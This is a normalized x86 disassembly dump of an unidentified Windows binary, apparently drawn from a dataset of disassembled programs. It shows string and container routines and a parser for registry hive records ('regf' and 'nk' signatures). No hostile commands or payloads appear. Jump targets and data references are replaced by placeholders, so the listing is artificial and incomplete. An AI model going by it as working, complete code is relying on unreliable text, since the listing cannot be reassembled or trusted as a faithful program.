call [ rw-data ]
test eax eax
jne r-xdata
xor al al
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x4 ] 0x4
jne r-xdata
mov cl [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
mov al 0x1
and cl al
mov [ edx ] cl
mov esp ebp
pop ebp
retn
sub_405230
push ebp
mov ebp esp
push esi
push 0x0
push edi
push 0x0
push 0x0
push 0x0
push r--data
push 0x0
push ebx
call [ rw-data ]
mov esi eax
test esi esi
jne r-xdata
push esi
call [ SetLastError@IAT ]
xor eax eax
test esi esi
sete al
pop esi
pop ebp
retn
mov eax [ edi ]
push eax
call sub_435b34
mov ecx [ ebp + 0x8 ]
add esp 0x4
push esi
push edi
mov [ ecx ] eax
mov edx [ edi ]
push edx
push eax
push esi
push r--data
push esi
push ebx
call [ rw-data ]
mov esi eax
test esi esi
je r-xdata
mov eax [ ebp + 0x8 ]
push eax
call sub_438111
add esp 0x4
sub_4052a0
push ebp
mov ebp esp
push ecx
push ebx
push r--data
push eax
lea ecx [ ebp - 0x4 ]
push ecx
xor bl bl
call sub_4382f0
add esp 0xc
test eax eax
jne r-xdata
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x4 ]
push 0x2
push eax
push edx
call sub_438972
add esp 0xc
test eax eax
jne r-xdata
mov edx [ ebp - 0x4 ]
push edx
call sub_438a5b
add esp 0x4
mov eax [ ebp - 0x4 ]
push esi
push eax
call sub_438883
mov esi eax
push esi
call sub_435b34
mov ecx [ ebp - 0x4 ]
push 0x0
push 0x0
push ecx
mov [ edi ] eax
call sub_438972
mov edx [ ebp - 0x4 ]
mov eax [ edi ]
push edx
push 0x1
push esi
push eax
call sub_4386d2
add esp 0x24
pop esi
cmp eax 0x1
jne r-xdata
mov ecx [ edi ]
cmp [ ecx ] 0x66676572
sete bl
sub_405330
push ebp
mov ebp esp
sub esp 0x8
push ebx
push esi
push edi
push 0x8
call sub_438337
mov esi eax
push 0x50
mov [ ebp - 0x8 ] esi
call sub_438337
push 0x8
mov ebx eax
call sub_438337
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edi eax
mov eax [ edx ]
mov ecx [ eax + ecx + 0x4 ]
mov [ edi ] ecx
mov ecx [ ebp + 0x10 ]
mov eax [ eax + ecx + 0x8 ]
mov [ edi + 0x4 ] eax
mov eax [ edx ]
lea ecx [ eax + ecx + 0x8 ]
xor eax eax
add esp 0xc
mov [ ebp - 0x4 ] edi
mov [ edi + 0x4 ] ecx
mov [ ebp + 0x10 ] 0x0
cmp ax [ edi + 0x2 ]
jl r-xdata
mov ecx [ edi + 0x4 ]
mov eax [ ebp + 0x10 ]
lea eax [ ecx + eax * 8 ]
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
mov eax ecx
mov ecx [ edx ]
lea esi [ ecx + eax + 0x1004 ]
mov ecx 0x14
mov edi ebx
[ edi ] [ esi ]
mov edx [ edx ]
mov edi [ ebp + 0xc ]
lea ecx [ edx + eax + 0x1050 ]
movsx edx [ ebx + 0x48 ]
mov eax edx
mov [ ebx + 0x4c ] ecx
mov esi ecx
cmp eax 0x4
jb r-xdata
push ebx
call sub_4381f8
push edi
call sub_4381f8
add esp 0x8
pop edi
pop esi
or eax 0xffffffff
pop ebx
mov esp ebp
pop ebp
retn
test eax eax
je r-xdata
nop
mov eax [ ebp + 0xc ]
lea esi [ eax + 0x1 ]
mov edi edi
mov cl [ esi ]
cmp cl [ edi ]
jne r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ebp + 0x10 ]
movsx edx [ ecx + 0x2 ]
inc eax
mov [ ebp + 0x10 ] eax
mov edi ecx
cmp eax edx
jl r-xdata
sub eax 0x4
add esi 0x4
add edi 0x4
cmp eax 0x4
jae r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
cmp eax edx
je r-xdata
cmp eax 0x1
jbe r-xdata
mov esi [ ebp - 0x8 ]
mov edx [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ edi ]
cmp ecx [ esi ]
jne r-xdata
push ebx
call sub_4381f8
mov eax [ ebp - 0x4 ]
push eax
call sub_4381f8
mov ecx [ ebp - 0x8 ]
mov eax [ ecx ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov cl [ esi + 0x1 ]
cmp cl [ edi + 0x1 ]
jne r-xdata
cmp eax 0x2
jbe r-xdata
mov al [ esi + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
sub_405480
push ebp
mov ebp esp
push ecx
push ebx
push 0x50
mov [ ebp - 0x1 ] 0x0
call sub_438178
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
xor ebx ebx
push 0x50
push 0x0
push ebx
call sub_43a820
add esp 0xc
jmp r-xdata
push ebx
call sub_43811c
mov al [ ebp - 0x1 ]
add esp 0x4
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x2 ] 0x2c
jne r-xdata
mov eax [ ebp + 0x8 ]
push esi
mov esi [ eax ]
push edi
add esi 0x1024
mov ecx 0x14
mov edi ebx
[ edi ] [ esi ]
mov eax [ eax ]
add eax 0x1070
mov ecx 0x6b6e
pop edi
mov [ ebx + 0x4c ] eax
pop esi
cmp [ ebx ] cx
jne r-xdata
movsx edx [ ebx + 0x48 ]
mov ecx [ ebp + 0xc ]
push edx
push eax
call sub_405a70
mov [ ebp - 0x1 ] 0x1
sub_405500
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x50
mov [ ebp - 0x1 ] 0x0
call sub_438178
mov ebx eax
add esp 0x4
test ebx ebx
je r-xdata
xor ebx ebx
push 0x50
push 0x0
push ebx
call sub_43a820
add esp 0xc
jmp r-xdata
push ebx
call sub_43811c
mov al [ ebp - 0x1 ]
add esp 0x4
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ ebx + 0x2 ] 0x2c
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax ]
add esi 0x1024
mov ecx 0x14
mov edi ebx
[ edi ] [ esi ]
mov eax [ eax ]
add eax 0x1070
mov ecx 0x6b6e
mov [ ebx + 0x4c ] eax
cmp [ ebx ] cx
jne r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] 0x10
jb r-xdata
push eax
call sub_450b79
push r--data
push eax
mov [ ebp - 0xc ] eax
call sub_4383cb
movsx ecx [ ebx + 0x48 ]
mov esi [ ebx + 0x4c ]
add esp 0xc
mov edi eax
cmp ecx 0x4
jb r-xdata
mov eax [ eax ]
test ecx ecx
je r-xdata
mov edx [ edi ]
cmp edx [ esi ]
jne r-xdata
push r--data
push 0x0
call sub_4383cb
mov esi eax
add esp 0x8
test esi esi
je r-xdata
mov al [ esi ]
cmp al [ edi ]
jne r-xdata
mov eax [ ebp - 0xc ]
push eax
call sub_4381f8
add esp 0x4
sub ecx 0x4
add esi 0x4
add edi 0x4
cmp ecx 0x4
jae r-xdata
mov edx [ ebp + 0x10 ]
mov edi [ edx ]
mov ecx 0x14
mov esi ebx
[ edi ] [ esi ]
mov [ ebp - 0x1 ] 0x1
mov ecx [ ebx + 0x1c ]
mov edi [ ebp + 0x8 ]
add ecx 0x1000
push ecx
push esi
push edi
call sub_405330
add esp 0xc
mov [ ebp - 0x8 ] eax
cmp eax 0xffffffff
je r-xdata
cmp ecx 0x1
jbe r-xdata
test esi esi
jne r-xdata
mov edx [ edi ]
lea esi [ edx + eax + 0x1004 ]
mov ecx 0x14
mov edi ebx
[ edi ] [ esi ]
mov ecx [ ebp + 0x8 ]
mov edx [ ecx ]
lea eax [ edx + eax + 0x1050 ]
push r--data
push 0x0
mov [ ebx + 0x4c ] eax
call sub_4383cb
mov esi eax
add esp 0x8
test esi esi
jne r-xdata
mov dl [ esi + 0x1 ]
cmp dl [ edi + 0x1 ]
jne r-xdata
jmp r-xdata
cmp [ ebp - 0x8 ] 0x1
je r-xdata
cmp ecx 0x2
jbe r-xdata
mov al [ esi + 0x2 ]
cmp al [ edi + 0x2 ]
jne r-xdata
sub_405690
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
push 0x18
mov [ ebp - 0x1 ] 0x0
call sub_438178
add esp 0x4
test eax eax
je r-xdata
xor esi esi
xor ecx ecx
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ eax + 0x8 ] ecx
mov [ eax + 0xc ] ecx
mov [ eax + 0x10 ] ecx
mov [ eax + 0x14 ] ecx
mov esi eax
jmp r-xdata
mov edx [ ebp - 0xc ]
push edx
call sub_438111
push esi
call sub_43811c
mov al [ ebp - 0x1 ]
add esp 0x8
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
jmp r-xdata
mov ebx [ ebp + 0x10 ]
mov eax [ ebx + 0x24 ]
xor ecx ecx
mov edx 0x4
mul edx
seto cl
neg ecx
or ecx eax
push ecx
call sub_435b34
mov ecx [ ebx + 0x24 ]
mov edi [ ebp + 0x8 ]
mov edx [ ebx + 0x28 ]
add ecx ecx
add ecx ecx
push ecx
mov ecx [ edi ]
lea edx [ edx + ecx + 0x1004 ]
push edx
push eax
mov [ ebp - 0xc ] eax
call sub_43a8a0
add esp 0x10
cmp [ ebx + 0x24 ] 0x0
mov [ ebp - 0x8 ] 0x0
jbe r-xdata
mov edx [ edi ]
mov eax [ ebp - 0xc ]
mov ecx [ ebp - 0x8 ]
mov ecx [ eax + ecx * 4 ]
lea eax [ edx + ecx + 0x1004 ]
mov edx [ eax ]
mov [ esi ] edx
mov edx [ eax + 0x4 ]
mov [ esi + 0x4 ] edx
mov edx [ eax + 0x8 ]
mov [ esi + 0x8 ] edx
mov edx [ eax + 0xc ]
mov [ esi + 0xc ] edx
mov edx [ eax + 0x10 ]
mov [ esi + 0x10 ] edx
mov eax [ eax + 0x14 ]
mov [ esi + 0x14 ] eax
mov edx [ edi ]
lea eax [ edx + ecx + 0x1018 ]
mov ecx [ ebp + 0xc ]
mov [ esi + 0x14 ] eax
mov edi [ ecx + 0x10 ]
mov ebx eax
mov eax ecx
call sub_405b70
cmp edi 0x4
jb r-xdata
test edi edi
je r-xdata
mov edi edi
movsx eax [ esi + 0x2 ]
mov ecx [ ebp + 0xc ]
cmp eax [ ecx + 0x10 ]
je r-xdata
mov dl [ ebx ]
cmp dl [ eax ]
jne r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ ebp + 0x10 ]
inc eax
mov [ ebp - 0x8 ] eax
cmp eax [ edx + 0x24 ]
jb r-xdata
sub edi 0x4
add ebx 0x4
add eax 0x4
cmp edi 0x4
jae r-xdata
mov eax [ esi + 0x4 ]
mov edi [ ebp + 0x18 ]
and eax 0xffff
push eax
mov [ edi ] eax
call sub_435b34
mov ecx [ ebp + 0x14 ]
mov [ ecx ] eax
mov ecx [ edi ]
add esp 0x4
push ecx
cmp ecx 0x5
jge r-xdata
cmp edi 0x1
jbe r-xdata
mov edi [ ebp + 0x8 ]
jmp r-xdata
mov ecx [ eax ]
cmp ecx [ ebx ]
jne r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ esi + 0x8 ]
mov edx [ edx ]
lea ecx [ ecx + edx + 0x1004 ]
push ecx
lea edx [ esi + 0x8 ]
push edx
jmp r-xdata
mov cl [ ebx + 0x1 ]
cmp cl [ eax + 0x1 ]
jne r-xdata
push eax
call sub_43a8a0
add esp 0xc
mov [ ebp - 0x1 ] 0x1
cmp edi 0x2
jbe r-xdata
mov dl [ ebx + 0x2 ]
cmp dl [ eax + 0x2 ]
jne r-xdata
sub_405830
push ebp
mov ebp esp
push ecx
push ebx
push esi
push 0x50
xor bl bl
call sub_438178
mov esi eax
add esp 0x4
test esi esi
je r-xdata
xor esi esi
push 0x50
push 0x0
push esi
call sub_43a820
add esp 0xc
jmp r-xdata
push esi
call sub_43811c
add esp 0x4
pop esi
mov al bl
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp + 0x14 ]
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0xc ]
push edx
push eax
push esi
push ecx
push edi
call sub_405690
add esp 0x14
mov bl al
mov ecx [ ebp + 0x8 ]
lea eax [ ebp - 0x4 ]
push eax
push ecx
push edi
mov [ ebp - 0x4 ] esi
call sub_405500
add esp 0xc
test al al
je r-xdata
sub_4058a0
push ebp
mov ebp esp
push 0xffffffff
push sub_452428
mov eax [ fs : 0x0 ]
push eax
sub esp 0x34
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov ebx ecx
xor esi esi
push 0x8
mov [ ebp - 0x40 ] ebx
mov [ ebp - 0x34 ] esi
call sub_438178
add esp 0x4
cmp eax esi
je r-xdata
mov [ ebp - 0x30 ] esi
mov edi esi
xor ecx ecx
mov edi eax
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x30 ] edi
jmp r-xdata
mov [ ebp - 0x3c ] 0x0
push 0x50
push 0x0
push esi
call sub_43a820
add esp 0xc
mov [ ebp - 0x3c ] esi
jmp r-xdata
push 0x50
call sub_438178
mov esi eax
add esp 0x4
test esi esi
je r-xdata
mov [ ebp - 0x38 ] ecx
mov esi ecx
mov esi eax
mov [ eax ] ecx
mov [ eax + 0x4 ] ecx
mov [ ebp - 0x38 ] esi
jmp r-xdata
push 0x8
call sub_438178
xor ecx ecx
add esp 0x4
cmp eax ecx
je r-xdata
push edi
call sub_43811c
mov edx [ ebx ]
xor eax eax
add esp 0x4
cmp edx [ ebx + 0x4 ]
setne al
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_437c1c
mov esp ebp
pop ebp
retn
jmp r-xdata
mov eax [ ebp + 0xc ]
cmp [ eax + 0x14 ] ecx
jle r-xdata
mov edx [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
mov eax [ ecx + 0x1c ]
mov ecx [ edx ]
mov ebx [ ecx + eax + 0x1004 ]
mov [ edi ] ebx
mov ecx [ ecx + eax + 0x1008 ]
mov ebx [ ebp - 0x3c ]
mov [ edi + 0x4 ] ecx
mov ecx [ edx ]
lea eax [ ecx + eax + 0x1008 ]
mov ecx [ ebp - 0x34 ]
mov [ edi + 0x4 ] eax
mov edi [ eax + ecx * 8 ]
mov [ esi ] edi
mov eax [ eax + ecx * 8 + 0x4 ]
mov [ esi + 0x4 ] eax
mov ecx [ edx ]
mov eax edi
lea esi [ ecx + eax + 0x1004 ]
mov edi ebx
mov ecx 0x14
[ edi ] [ esi ]
movsx ecx [ ebx + 0x48 ]
mov edx [ edx ]
lea eax [ edx + eax + 0x1050 ]
push ecx
mov [ ebx + 0x4c ] eax
xor ebx ebx
push eax
lea ecx [ ebp - 0x2c ]
mov [ ebp - 0x18 ] 0xf
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x2c ] bl
call sub_405a70
mov [ ebp - 0x4 ] ebx
mov ebx [ ebp - 0x40 ]
lea ecx [ ebp - 0x2c ]
call sub_405b80
mov [ ebp - 0x4 ] 0xffffffff
cmp [ ebp - 0x18 ] 0x10
jb r-xdata
mov eax [ ebp - 0x34 ]
mov ecx [ ebp + 0xc ]
mov edi [ ebp - 0x30 ]
inc eax
mov [ ebp - 0x34 ] eax
cmp eax [ ecx + 0x14 ]
jl r-xdata
mov eax [ ebp - 0x2c ]
push eax
call sub_43811c
add esp 0x4
mov esi [ ebp - 0x38 ]
sub_405a40
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
pop esi
retn
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_405a70
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
push esi
mov esi ecx
test ebx ebx
je r-xdata
push edi
mov edi [ ebp + 0xc ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
mov edx [ esi + 0x10 ]
push edx
push edi
mov ecx esi
call sub_405f00
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
push edi
push ebx
push eax
call sub_43a8a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
mov ecx [ ebp + 0xc ]
mov eax esi
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_405cb0
pop esi
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
mov ecx [ ebp + 0xc ]
push ecx
sub ebx eax
push ebx
push esi
mov ecx esi
call sub_405cb0
pop esi
pop ebx
pop ebp
retn 0x8
sub_405b80
push ebp
mov ebp esp
push 0xffffffff
push sub_451b12
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
mov ecx [ ebx + 0x4 ]
cmp edi ecx
jae r-xdata
cmp ecx [ ebx + 0x8 ]
jne r-xdata
mov eax [ ebx ]
cmp eax edi
ja r-xdata
mov esi [ ebx + 0x4 ]
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] 0x1
xor eax eax
mov ecx ebx
call sub_405df0
sub edi eax
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
cmp ecx [ ebx + 0x8 ]
jne r-xdata
add [ ebx + 0x4 ] 0x1c
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov esp ebp
pop ebp
retn
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] eax
mov [ esi ] al
call sub_405c40
mov ecx [ ebx ]
lea eax [ esi * 8 ]
sub eax esi
mov esi [ ebx + 0x4 ]
lea edi [ ecx + eax * 4 ]
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x14 ] esi
xor eax eax
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov ecx ebx
call sub_405df0
cmp esi eax
je r-xdata
sub_405c40
cmp esi edi
je r-xdata
mov eax esi
retn
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
cmp [ edi + 0x14 ] 0x10
jae r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
mov edx [ edi ]
mov [ esi ] edx
mov [ edi ] 0x0
mov ecx [ edi + 0x10 ]
inc ecx
push ecx
push edi
push esi
call sub_437db0
add esp 0xc
jmp r-xdata
mov eax [ edi + 0x10 ]
mov [ esi + 0x10 ] eax
mov ecx [ edi + 0x14 ]
mov [ esi + 0x14 ] ecx
mov [ edi + 0x14 ] 0xf
mov [ edi + 0x10 ] 0x0
mov [ edi ] 0x0
sub_405cb0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_435ac6
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_405e70
push ebx
push 0x0
mov ecx esi
call sub_405e70
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_405f00
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_43a8a0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_405da0
push ebp
mov ebp esp
cmp [ ebp + 0x8 ] 0x0
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi ecx
je r-xdata
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] 0xf
mov [ edi + esi ] 0x0
pop edi
pop esi
pop ebp
retn 0x8
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push ebx
mov ebx [ esi ]
test edi edi
je r-xdata
push ebx
call sub_43811c
add esp 0x4
pop ebx
push edi
push ebx
push esi
call sub_43a8a0
add esp 0xc
sub_405df0
push ebx
mov ebx [ ecx ]
push esi
mov esi [ ecx + 0x4 ]
sub esi ebx
mov eax 0x92492493
imul esi
add edx esi
sar edx 0x4
mov esi edx
shr esi 0x1f
add esi edx
push edi
cmp esi 0x9249248
jbe r-xdata
mov edi [ ecx + 0x8 ]
sub edi ebx
mov eax 0x92492493
imul edi
add edx edi
sar edx 0x4
mov eax edx
shr eax 0x1f
inc esi
add eax edx
cmp esi eax
jbe r-xdata
push r--data
call sub_435a79
pop edi
pop esi
pop ebx
retn
mov edx eax
shr edx 0x1
mov edi 0x9249249
sub edi edx
cmp edi eax
jae r-xdata
add eax edx
xor eax eax
jmp r-xdata
push eax
call sub_406070
mov eax esi
cmp eax esi
jae r-xdata
sub_405e70
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_435ac6
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_437db0
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_405f00
push ebp
mov ebp esp
push 0xffffffff
push sub_4512b0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov edi ecx
mov [ ebp - 0x14 ] edi
mov eax [ ebp + 0x8 ]
mov esi eax
or esi 0xf
cmp esi 0xfffffffe
jbe r-xdata
mov ebx [ edi + 0x14 ]
mov eax 0xaaaaaaab
mul esi
mov ecx ebx
shr ecx 0x1
shr edx 0x1
cmp ecx edx
jbe r-xdata
mov esi eax
jmp r-xdata
xor eax eax
lea ecx [ esi + 0x1 ]
mov [ ebp - 0x4 ] eax
cmp ecx eax
jbe r-xdata
mov eax 0xfffffffe
sub eax ecx
lea esi [ ecx + ebx ]
cmp ebx eax
jbe r-xdata
mov [ ebp + 0x8 ] eax
jmp r-xdata
cmp ecx 0xffffffff
ja r-xdata
mov esi 0xfffffffe
mov ebx [ ebp + 0xc ]
test ebx ebx
je r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea ecx [ ebp - 0x28 ]
mov [ ebp - 0x18 ] 0x0
call sub_437cb3
push r--data
lea edx [ ebp - 0x28 ]
push edx
mov [ ebp - 0x28 ] r--data
call sub_43c3a5
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x1c ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
add ecx 0x18
mov [ ebp - 0x4 ] 0x2
call sub_406180
mov [ ebp + 0x8 ] eax
mov eax r-xdata
retn
push ecx
call sub_438178
add esp 0x4
test eax eax
je r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
cmp [ edi + 0x14 ] 0x10
jb r-xdata
mov eax [ ebp + 0x8 ]
mov [ edi ] 0x0
mov [ edi ] eax
mov [ edi + 0x14 ] esi
mov [ edi + 0x10 ] ebx
cmp esi 0x10
jb r-xdata
mov ecx [ edi ]
push ecx
call sub_43811c
add esp 0x4
mov eax edi
mov eax [ edi ]
jmp r-xdata
mov [ edi + ebx ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov edi eax
push ebx
push eax
mov eax [ ebp + 0x8 ]
push eax
call sub_43a8a0
add esp 0xc
sub_40603b
mov esi [ ebp - 0x14 ]
cmp [ esi + 0x14 ] 0x10
jb r-xdata
push 0x0
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
push 0x0
mov [ esi ] 0x0
call sub_43c3a5
int3
mov edx [ esi ]
push edx
call sub_43811c
add esp 0x4
sub_406070
push ebp
mov ebp esp
push 0xffffffff
push sub_452400
mov eax [ fs : 0x0 ]
push eax
sub esp 0x8
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi ecx
mov edi [ ebp + 0x8 ]
cmp edi 0x9249249
jbe r-xdata
mov ecx [ esi + 0x8 ]
sub ecx [ esi ]
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov eax edx
shr eax 0x1f
add eax edx
cmp eax edi
jae r-xdata
push r--data
call sub_435a79
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
mov ecx edi
call sub_406210
mov [ ebp - 0x4 ] 0x0
mov edi [ ebp + 0x8 ]
mov edx [ esi + 0x4 ]
mov ecx [ esi ]
push edi
push eax
push edx
mov [ ebp - 0x14 ] eax
call sub_406270
mov edi [ esi ]
mov ecx [ esi + 0x4 ]
sub ecx edi
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x4
mov ebx edx
shr ebx 0x1f
add esp 0xc
add ebx edx
test edi edi
je r-xdata
mov eax [ ebp + 0x8 ]
lea edx [ eax * 8 ]
sub edx eax
mov eax [ ebp - 0x14 ]
lea ecx [ eax + edx * 4 ]
lea edx [ ebx * 8 ]
sub edx ebx
mov [ esi + 0x8 ] ecx
lea ecx [ eax + edx * 4 ]
mov [ esi + 0x4 ] ecx
mov [ esi ] eax
mov edi [ esi + 0x4 ]
mov eax [ esi ]
call sub_4061d0
mov ecx [ esi ]
push ecx
call sub_43811c
add esp 0x4
sub_406180
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
sub esp 0xc
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn 0x4
cmp ecx 0xffffffff
ja r-xdata
lea eax [ ebp + 0x8 ]
push eax
lea ecx [ ebp - 0xc ]
mov [ ebp + 0x8 ] 0x0
call sub_437cb3
push r--data
lea ecx [ ebp - 0xc ]
push ecx
mov [ ebp - 0xc ] r--data
call sub_43c3a5
push ecx
call sub_438178
add esp 0x4
test eax eax
jne r-xdata
sub_4061d0
push esi
mov esi eax
cmp esi edi
je r-xdata
pop esi
retn
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x14 ] 0xf
mov [ esi + 0x10 ] 0x0
mov [ esi ] 0x0
add esi 0x1c
cmp esi edi
jne r-xdata
mov eax [ esi ]
push eax
call sub_43811c
add esp 0x4
sub_406210
push ebp
mov ebp esp
sub esp 0x10
xor eax eax
test ecx ecx
je r-xdata
mov esp ebp
pop ebp
retn
cmp ecx 0x9249249
